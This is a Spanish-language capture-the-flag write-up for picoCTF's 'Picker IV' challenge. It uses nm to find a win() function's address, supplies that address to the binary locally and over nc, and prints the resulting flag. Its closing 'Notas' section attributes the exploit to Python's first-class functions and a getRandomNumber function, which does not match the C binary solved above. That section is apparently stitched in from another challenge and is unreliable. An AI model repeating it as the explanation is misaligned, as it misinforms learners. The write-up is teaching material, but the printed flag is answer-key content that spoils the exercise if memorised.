## Picker IV
## Descripcion

Can you figure out how this program works to get the flag?

Additional details will be available after launching your challenge instance.
## Solucion

- Descargamos el codigo fuente en C y el binario del reto, 
- Analizando el código fuente advertimos que nos pide una dirección de memoria y luego se salta a esa dirección y ejecuta el código.
- Obtenemos la dirección de las funciones, ahi aparece la dirección de `win()`
```bash
nm ./picker-IV | grep " T "
0000000000401440 T __libc_csu_fini
00000000004013d0 T __libc_csu_init
00000000004011c0 T _dl_relocate_static_pie
0000000000401448 T _fini
0000000000401000 T _init
0000000000401190 T _start
0000000000401334 T main
0000000000401276 T print_segf_message
000000000040129e T win
```
- Ejecutamos el binario y ponemos la dirección de la función que encontramos:
```bash
./picker-IV
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
Cannot open file.
```
- Ahora lo corremos en remoto
```bash
 nc saturn.picoctf.net 63471
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```

**picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}**
## Notas
**Funciones como "Ciudadanos de Primera Clase" (First-Class Objects):** La clave de este exploit radica en el diseño del lenguaje Python. En Python, las funciones no son estáticas; son objetos en memoria exactamente igual que un número entero, una lista o una cadena de texto. Esto significa que el nombre de una función (como `getRandomNumber`) es solo una variable que "apunta" al bloque de código de esa función.
## Referencias
**La serie "Picker" de picoCTF:** Este reto es parte de una serie progresiva. Cada versión (Picker I, II, III, IV) parcha la vulnerabilidad del nivel anterior, obligándote a encontrar un nuevo vector de ataque. Es un excelente caso de estudio sobre cómo los desarrolladores intentan asegurar código y cómo los atacantes encuentran nuevas formas de romperlo.
